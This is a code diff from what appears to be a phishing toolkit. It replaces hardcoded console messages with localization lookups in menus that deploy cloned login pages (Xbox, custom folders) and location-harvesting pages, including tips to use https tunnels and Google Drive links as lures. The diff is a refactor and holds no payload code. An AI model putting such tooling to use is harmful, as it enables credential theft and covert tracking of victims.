@@ -29,7 +29,7 @@ def start_main_menu():
         #print("".join(word.ljust(phishing_col_width) for word in row).format(default_palette[0], default_palette[2]))                         
     print_sorted_as_menu(localization.lang_start_main_menu["phishing_modules_list"])
     print(localization.lang_start_main_menu["additional_modules"])
-    
+
     #additional_col_width = max(len(word) for row in additional_modules_list for word in row) + 2
     #for row in additional_modules_list:
         #print("".join(word.ljust(additional_col_width) for word in row).format(default_palette[0], default_palette[2]))
@@ -347,17 +347,17 @@ def start_phishing_page(page, custom_option):  # Phishing pages selection menu
     elif page == 'Xbox':
         webpage_set('WebPages/xbox/', "Server/www/")
     elif page == 'CUSTOM(1)':
-        print("\n\n {0}[{1}*{0}]{1} Custom Folder Directory is {0}WebPages/CUSTOM(1)".format(default_palette[0], default_palette[4]))
-        print("\n {0}[{1}*{0}]{1} Please Read The manual.txt File Available At {0}[WebPages/CUSTOM(1)]".format(default_palette[0], default_palette[4]))
-        input("\n\n {0}[{1}*{0}]{1} If You Have Set Up The Files Correctly, {0}Press Enter To continue.".format(default_palette[0], default_palette[4]))
-        print("\n {0}[{1}*{0}]{1} Copying Your Files To Server/www Folder...".format(default_palette[0], default_palette[4]))
+        print(localization.lang_start_phishing_page["custom_folder_directory"].format(page = page))
+        print(localization.lang_start_phishing_page["manual_reading_suggestion"].format(page = page))
+        input(localization.lang_start_phishing_page["press_enter_to_contunue_if_setup_correctly"])
+        print(localization.lang_start_phishing_page["copying_your_files"])
         wait(3)
         webpage_set('WebPages/CUSTOM(1)/', "Server/www/")
     elif page == 'CUSTOM(2)':
-        print("\n\n {0}[{1}*{0}]{1} Custom Folder Directory is {0}WebPages/CUSTOM(2)".format(default_palette[0], default_palette[4]))
-        print("\n {0}[{1}*{0}]{1} Please Read The manual.txt File Available At {0}[WebPages/CUSTOM(2)]".format(default_palette[0], default_palette[4]))
-        input("\n\n {0}[{1}*{0}]{1} If You Have Set Up The Files Correctly, {0}Press Enter To continue.".format(default_palette[0], default_palette[4]))
-        print("\n {0}[{1}*{0}]{1} Copying Your Files To Server/www Folder...".format(default_palette[0], default_palette[4]))
+        print(localization.lang_start_phishing_page["custom_folder_directory"].format(page = page))
+        print(localization.lang_start_phishing_page["manual_reading_suggestion"].format(page = page))
+        input(localization.lang_start_phishing_page["press_enter_to_contunue_if_setup_correctly"])
+        print(localization.lang_start_phishing_page["copying_your_files"])
         wait(3)
         webpage_set('WebPages/CUSTOM(2)/', "Server/www/")
     
@@ -366,13 +366,14 @@ def start_phishing_page(page, custom_option):  # Phishing pages selection menu
     elif custom_option == '1' and page == 'LOCATION':
         wait(3)
         webpage_set('WebPages/TOOLS/nearyou', "Server/www/")
-        print("\n\n{0}[{1}*{0}]{1} PLEASE USE TUNNELS/URL WITH '{0}https{1}' \n{0}[{1}*{0}]{1} Browsers Trusts only Https Links To Share Location\n".format(default_palette[0], default_palette[4]))
-        input('\nPress Enter To continue...')
+        print(localization.lang_start_phishing_page["https_suggestion"])
+        input(localization.lang_start_phishing_page["press_enter_to_contunue_if_setup_correctly"])
     elif custom_option == '2' and page == 'LOCATION':
         wait(3)
         webpage_set('WebPages/TOOLS/gdrive', "Server/www/")
-        print("\n\n{0}[{1}*{0}]{1} PLEASE USE TUNNELS/URL WITH '{0}https{1}' \n{0}[{1}*{0}]{1} Browsers Trusts only Https Links To Share Location\n{0}[{1}*{0}]{1} {0}Tip: {1}Use Google Drive File Url as Custom Url while asked.".format(default_palette[0], default_palette[4]))
-        input('\nPress Enter To continue...')
+        print(localization.lang_start_phishing_page["https_suggestion"])
+        print(localization.lang_start_phishing_page["gdrive_suggestion"])
+        input(localization.lang_start_phishing_page["press_enter_to_contunue_if_setup_correctly"])
 
     else:
         simple_informant.exit_message(port)
